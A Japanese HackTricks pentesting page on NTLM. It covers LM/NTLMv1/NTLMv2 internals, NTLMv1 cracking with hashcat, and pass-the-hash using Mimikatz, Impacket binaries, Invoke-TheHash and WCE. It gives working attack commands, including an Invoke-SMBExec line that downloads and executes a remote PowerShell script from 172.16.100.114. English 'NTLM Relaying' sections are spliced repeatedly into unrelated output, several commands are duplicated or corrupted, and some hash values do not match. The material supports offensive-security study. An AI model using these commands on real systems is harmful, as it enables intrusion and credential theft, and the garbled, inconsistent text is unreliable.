# NTLM

## NTLM

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または**最新バージョンのPEASSにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションをご覧ください
* [**公式PEASS＆HackTricksスウェグ**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) **Discordグループ**に参加するか、[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **ハッキングトリックを共有するためにPRを** [**hacktricksリポジトリ**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloudリポジトリ**](https://github.com/carlospolop/hacktricks-cloud) **に提出してください。**

</details>

### 基本情報

**Windows XPとServer 2003**が稼働している環境では、LM（Lan Manager）ハッシュが使用されますが、これらは簡単に破られる可能性があることが広く認識されています。特定のLMハッシュ、`AAD3B435B51404EEAAD3B435B51404EE`は、LMが使用されていない状況を示し、空の文字列のハッシュを表します。

デフォルトでは、**Kerberos**認証プロトコルが主要な方法として使用されます。NTLM（NT LAN Manager）は、Active Directoryの不在、ドメインの非存在、Kerberosの不適切な構成による機能不全、または有効なホスト名の代わりにIPアドレスを使用して接続を試みる場合など、特定の状況下で使用されます。

ネットワークパケットに\*\*"NTLMSSP"\*\*ヘッダーが存在すると、NTLM認証プロセスがシグナルされます。

認証プロトコル（LM、NTLMv1、NTLMv2）のサポートは、`%windir%\Windows\System32\msv1\_0.dll`という特定のDLLによって可能になります。

**要点**:

* LMハッシュは脆弱であり、空のLMハッシュ（`AAD3B435B51404EEAAD3B435B51404EE`）はその非使用を示します。
* Kerberosがデフォルトの認証方法であり、NTLMは特定の条件下でのみ使用されます。
* NTLM認証パケットは"NTLMSSP"ヘッダーによって識別されます。
* システムファイル`msv1\_0.dll`によって、LM、NTLMv1、およびNTLMv2プロトコルがサポートされています。

### LM、NTLMv1およびNTLMv2

使用されるプロトコルを確認および設定できます:

#### GUI

\_secpol.msc\_を実行 -> ローカルポリシー -> セキュリティオプション -> ネットワークセキュリティ: LAN Manager認証レベル。 レベルは6つあります（0から5）。

![](<../../.gitbook/assets/image (92).png>)

#### レジストリ

これにより、レベル5が設定されます:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```

可能な値:

```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```

### 基本的なNTLMドメイン認証スキーム

1. **ユーザー**が**資格情報**を入力します
2. クライアントマシンが**認証リクエストを送信**し、**ドメイン名**と**ユーザー名**を送信します
3. **サーバー**が**チャレンジ**を送信します
4. **クライアント**は**パスワードのハッシュを使用**して**チャレンジを暗号化**し、応答として送信します
5. **サーバー**は**ドメインコントローラー**に**ドメイン名、ユーザー名、チャレンジ、応答**を送信します。Active Directoryが構成されていない場合や、ドメイン名がサーバー名の場合、資格情報は**ローカルで確認**されます。
6. **ドメインコントローラー**がすべてが正しいかどうかを確認し、情報をサーバーに送信します

**サーバー**と**ドメインコントローラー**は、**NTDS.DIT**データベース内にサーバーのパスワードがあるため、**Netlogon**サーバーを介して**セキュアチャネル**を作成できます。

#### ローカルNTLM認証スキーム

認証は前述のように行われますが、**サーバー**は**SAM**ファイル内で認証しようとする**ユーザーのハッシュ**を知っています。したがって、ドメインコントローラーに問い合わせる代わりに、**サーバー自体がユーザーの認証を確認**します。

#### NTLMv1チャレンジ

**チャレンジの長さは8バイト**で、**応答は24バイト**です。

**NTハッシュ（16バイト）は7バイトずつ3つの部分**に分かれます（7B + 7B +（2B + 0x00\*5））：**最後の部分はゼロで埋められます**。その後、**各部分ごとにチャレンジ**を**別々に暗号化**し、**結果の**暗号化されたバイトを**結合**します。合計：8B + 8B + 8B = 24バイト。

**問題点**：

* **ランダム性の欠如**
* 3つの部分は**個別に攻撃**され、NTハッシュが見つかる可能性があります
* **DESは破られやすい**
* 3番目のキーは常に**5つのゼロ**で構成されています。
* 同じチャレンジが与えられると、**応答**も**同じ**になります。したがって、被害者に対して文字列「**1122334455667788**」を**チャレンジ**として与え、**事前計算されたレインボーテーブル**を使用して使用された応答を攻撃できます。

#### NTLMv1攻撃

最近では、Unconstrained Delegationが構成された環境を見つけることが少なくなっていますが、これは**悪用できないことを意味しません**。構成されたプリントスプーラーサービスを**悪用**することができます。

ADで既に持っている一部の資格情報/セッションを**使用して、プリンターに対して**ある**コントロール下のホスト**に対して**認証を要求**することができます。その後、`metasploit auxiliary/server/capture/smb`または`responder`を使用して、**認証チャレンジを1122334455667788**に設定し、認証試行をキャプチャし、それが**NTLMv1**を使用して行われた場合、**破る**ことができます。\
`responder`を使用している場合は、**`--lm`フラグを使用**して**認証をダウングレード**しようとすることができます。\
_このテクニックでは、認証はNTLMv1を使用して実行する必要があります（NTLMv2は有効ではありません）。_

プリンターは認証中にコンピューターアカウントを使用し、コンピューターアカウントは**長くランダムなパスワード**を使用していますが、一般的な**辞書**を使用して**破ることはできない**可能性があります。しかし、**NTLMv1**認証は**DESを使用**しています（[詳細はこちら](./#ntlmv1-challenge)）、そのため、DESを破るために特に専用のサービスを使用することで、それを破ることができます（たとえば、[https://crack.sh/](https://crack.sh)を使用できます）。

#### hashcatを使用したNTLMv1攻撃

NTLMv1はNTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) を使用して、hashcatで破ることができる形式でNTLMv1メッセージをフォーマットします。

コマンド

```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```

### NTLM Relaying

#### Overview

NTLM relaying is a technique used to relay authentication attempts from one system to another in order to gain unauthorized access. This is typically achieved by intercepting NTLM authentication traffic and forwarding it to another system where the attacker can authenticate using the captured credentials.

#### Usage

1.  **Install Impacket**:

    ```bash
    pip install impacket
    ```
2.  **Run NTLM Relay**:

    ```bash
    ntlmrelayx.py -t <target_ip>
    ```
3.  **Relay to SMB**:

    ```bash
    ntlmrelayx.py -t <target_ip> -smb2support
    ```

#### Mitigation

To mitigate NTLM relaying attacks, consider implementing the following measures:

* Disable NTLM authentication in favor of more secure protocols like Kerberos.
* Enable SMB signing to prevent relay attacks on SMB traffic.
* Implement network segmentation to limit the reach of potential relay attacks.

```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```

## NTLM Relaying Attack

### Description

NTLM relaying is a common technique used by attackers to escalate privileges in a Windows environment. This attack involves intercepting NTLM authentication traffic and relaying it to other systems to gain unauthorized access.

### How it works

1. The attacker intercepts NTLM authentication traffic between a client and a server.
2. The attacker relays the captured authentication to another system within the network.
3. The target system receives the authentication request, thinking it is coming from the original client.
4. If successful, the attacker gains unauthorized access to the target system using the relayed credentials.

### Mitigation

To prevent NTLM relaying attacks, consider implementing the following measures:

* Disable NTLM authentication where possible and use more secure protocols like Kerberos.
* Enable SMB signing to protect against tampering with authentication traffic.
* Implement Extended Protection for Authentication to prevent relaying attacks.
* Use Group Policy to restrict NTLM usage and enforce stronger authentication mechanisms.

By following these best practices, you can significantly reduce the risk of NTLM relaying attacks in your Windows environment.

```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```

#### Translation

```html
ラン hashcat（hashtopolis などのツールを介して分散させるのが最適）を実行してください。そうしないと数日かかります。
```

```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```

この場合、パスワードは「password」であることがわかっているため、デモ目的で不正行為を行います。

```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```

次に、hashcatユーティリティを使用して、クラックされたDESキーをNTLMハッシュの一部に変換する必要があります：

```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```

最後の部分：

```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```

### NTLM Relaying

#### Overview

NTLM relaying is a common technique used by attackers to move laterally within a network by leveraging the NTLM authentication protocol. This technique involves intercepting an NTLM authentication request from a victim host and relaying it to another host within the network to authenticate and gain access.

#### How it works

1. Attacker intercepts an NTLM authentication request from a victim host.
2. Attacker relays the authentication request to another host within the network.
3. The second host automatically responds to the authentication request, providing the attacker with access.

#### Impact

NTLM relaying can allow an attacker to gain unauthorized access to sensitive systems and resources within a network. It can also be used to escalate privileges and move laterally to other hosts, increasing the scope of the attack.

#### Mitigation

To mitigate NTLM relaying attacks, it is recommended to:

* Implement SMB signing to prevent interception of authentication requests.
* Use LDAP signing and channel binding to protect LDAP communications.
* Disable NTLM authentication in favor of more secure protocols like Kerberos.
* Implement network segmentation to limit lateral movement within the network.

```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```

#### NTLMv2 チャレンジ

**チャレンジの長さは8バイト**であり、**2つのレスポンスが送信**されます: 1つは**24バイト**で、もう1つの**長さは可変**です。

**最初のレスポンス**は、**クライアントとドメイン**から構成される**文字列**を使用して**HMAC\_MD5**を使って暗号化し、**NTハッシュ**の**MD4ハッシュ**を**キー**として使用します。その後、**結果**は**チャレンジ**を暗号化するための**キー**として使用されます。ここに**8バイトのクライアントチャレンジ**が追加されます。合計: 24 B。

**2番目のレスポンス**は、**複数の値**（新しいクライアントチャレンジ、**リプレイ攻撃**を避けるための**タイムスタンプ**など）を使用して作成されます。

**成功した認証プロセスをキャプチャしたpcapファイル**がある場合、このガイドに従ってドメイン、ユーザー名、チャレンジ、レスポンスを取得し、パスワードを解読してみることができます: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)

### パス・ザ・ハッシュ

**被害者のハッシュを取得したら**、それを**偽装**することができます。\
その**ハッシュを使用して**NTLM認証を行う**ツール**を使用する必要があります。**または**、新しい**セッションログオン**を作成し、その**ハッシュ**を**LSASS**に**インジェクト**することができます。そのため、**NTLM認証が実行されると**、その**ハッシュが使用されます。** 最後のオプションがmimikatzが行うことです。

**パス・ザ・ハッシュ攻撃はコンピューターアカウントを使用しても実行できることを覚えておいてください。**

#### **Mimikatz**

**管理者として実行する必要があります**

```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```

これにより、mimikatzを起動したユーザーに属するプロセスが開始されますが、LSASS内部では、保存された資格情報はmimikatzパラメーター内にあります。その後、そのユーザーであるかのようにネットワークリソースにアクセスできます（`runas /netonly`トリックに類似していますが、平文パスワードを知る必要はありません）。

#### LinuxからのPass-the-Hash

LinuxからPass-the-Hashを使用してWindowsマシンでコード実行を取得できます。\
[**こちらをクリックして方法を学んでください。**](https://github.com/carlospolop/hacktricks/blob/jp/windows/ntlm/broken-reference/README.md)

#### Impacket Windowsコンパイル済みツール

Windows用のimpacketバイナリを[こちらからダウンロードできます](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries)。

* **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
* **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
* **atexec.exe**（この場合、コマンドを指定する必要があります。cmd.exeとpowershell.exeは対話シェルを取得するために有効ではありません）`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
* 他にもいくつかのImpacketバイナリがあります...

#### Invoke-TheHash

こちらからpowershellスクリプトを入手できます：[https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

**Invoke-SMBExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-WMIExec**

**Invoke-WMIExec**

```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```

**Invoke-SMBClient**

**Invoke-SMBClient**

Invoke-SMBClientを使用すると、NTLMハッシュを取得するためにSMB経由でリモートマシンに接続できます。このツールは、リモートマシンに対して認証情報を提供することなく、NTLMハッシュを取得するために使用されます。

```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```

**Invoke-SMBEnum**

**Invoke-SMBEnum**

```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```

**Invoke-TheHash**

この機能は**他のすべての機能を組み合わせたもの**です。**複数のホスト**を渡すことができ、**除外**することもでき、使用したい**オプション**を選択できます（_SMBExec、WMIExec、SMBClient、SMBEnum_）。**SMBExec**と**WMIExec**のいずれかを選択した場合、しかし_**Command**_パラメータを指定しない場合、単に**十分な権限**があるかどうかを**チェック**します。

```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```

#### [Evil-WinRM パス・ザ・ハッシュ](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

#### Windows Credentials Editor (WCE)

**管理者として実行する必要があります**

このツールは、mimikatzと同じことを行います（LSASSメモリの変更）。

```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```

#### ユーザー名とパスワードを使用した手動のWindowsリモート実行

{% content-ref url="../lateral-movement/" %}
[lateral-movement](../lateral-movement/)
{% endcontent-ref %}

### Windowsホストからの資格情報の抽出

**Windowsホストから資格情報を取得する方法についての詳細は、**[**このページ**](https://github.com/carlospolop/hacktricks/blob/jp/windows-hardening/ntlm/broken-reference/README.md)**を参照してください。**

### NTLMリレーとレスポンダー

**これらの攻撃を実行する方法の詳細なガイドについては、**[**こちら**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)**を読んでください。**

### ネットワークキャプチャからNTLMチャレンジを解析する

[**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)**を使用できます**

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）でAWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝したいですか？** **またはPEASSの最新バージョンにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)、当社の独占的な[NFTs](https://opensea.io/collection/the-peass-family)コレクションを発見
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)**に参加するか、**[**Telegramグループ**](https://t.me/peass)**に参加するか、Twitterで私をフォローする🐦**[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* \*\*ハッキングトリックを共有するために、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)**と**[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)\*\*にPRを提出してください。

</details>
